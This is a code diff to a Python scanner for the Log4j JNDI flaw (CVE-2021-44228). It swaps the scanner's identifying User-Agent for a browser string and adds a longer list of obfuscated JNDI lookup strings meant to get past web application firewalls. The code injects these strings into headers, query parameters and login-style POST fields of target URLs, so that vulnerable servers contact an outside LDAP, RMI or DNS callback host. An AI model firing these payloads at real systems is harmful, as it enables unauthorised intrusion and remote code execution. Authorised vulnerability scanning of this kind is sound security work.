@@ -43,21 +43,26 @@ if len(sys.argv) <= 1:
 
 
 default_headers = {
-    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
-    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
+    # 'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
 timeout = 4
 
-waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
-                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
-                       "${jndi:rmi://{{callback_host}}}",
-                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
-                       "${jndi:dns://{{callback_host}}}"]
+waf_bypass_payloads = [
+    "${jndi:rmi://{{callback_host}}}",
+    "${${::-j}${::-n}${::-d}${::-i}${::-:}${::-r}${::-m}${::-i}${::-:}${::-/}${::-/}{{callback_host}}/{{random}}}",
+    "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
+    "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
+    "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
+    "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
+    "${jndi:dns://{{callback_host}}}",
+    "${${env:AAAAAAAAAAAA:-j}ndi${env:AAAAAAAAAAAA:-:}${env:AAAAAAAAAAAA:-d}ns${env:AAAAAAAAAAAA:-:}//{{callback_host}}/{{random}}}",
+    "${${env:AAAAAAAAAAAA:-j}ndi${env:AAAAAAAAAAAA:-:}${env:AAAAAAAAAAAA:-d}ns${env:AAAAAAAAAAAA:-:}//{{callback_host}}/{{random}}}",
+    "${${uPBeLd:JghU:kyH:C:TURit:-j}${odX:t:STGD:UaqOvq:wANmU:-n}${mgSejH:tpr:zWlb:-d}${ohw:Yyz:OuptUo:gTKe:BFxGG:-i}${fGX:L:KhSyJ:-:}${E:o:wsyhug:LGVMcx:-d}${Prz:-n}${d:PeH:OmFo:GId:-s}${NLsTHo:-:}${uwF:eszIV:QSvP:-/}${JF:l:U:-/}{{callback_host}}/{{random}}",
+    #"${jnd${lower:${upper:ı}}:dns://{{callback_host}}/{{random}}" # getting 'latin-1' codec can't encode character '\u0131' in position 21: ordinal not in range(256)
+]
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -130,6 +135,7 @@ def get_fuzzing_headers(payload):
         fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
 
     fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
+    #print("returning fuzzing headers")
     return fuzzing_headers
 
 
@@ -137,6 +143,7 @@ def get_fuzzing_post_data(payload):
     fuzzing_post_data = {}
     for i in post_data_parameters:
         fuzzing_post_data.update({i: payload})
+    #print("returning post data headers")
     return fuzzing_post_data
 
 
@@ -248,19 +255,22 @@ def parse_url(url):
             "file_path": file_path})
 
 
-def scan_url(url, callback_host):
+def scan_url(url, callback_host, override = False):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
     payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+    if override:
+        payloads = [f'${{jndi:ldap://{callback_host}:53}}']
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
                 requests.request(url=url,
                                  method="GET",
+                                 # TODO: use list of most common GET params from seclists
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  verify=False,
@@ -274,6 +284,7 @@ def scan_url(url, callback_host):
                 # Post body
                 requests.request(url=url,
                                  method="POST",
+                                # TODO: use list of most common POST params from seclists
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  data=get_fuzzing_post_data(payload),
@@ -326,7 +337,7 @@ def main():
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
     for url in urls:
         cprint(f"[•] URL: {url}", "magenta")
-        scan_url(url, dns_callback_host)
+        scan_url(url, dns_callback_host, args.custom_dns_callback_host)
 
     if args.custom_dns_callback_host:
         cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
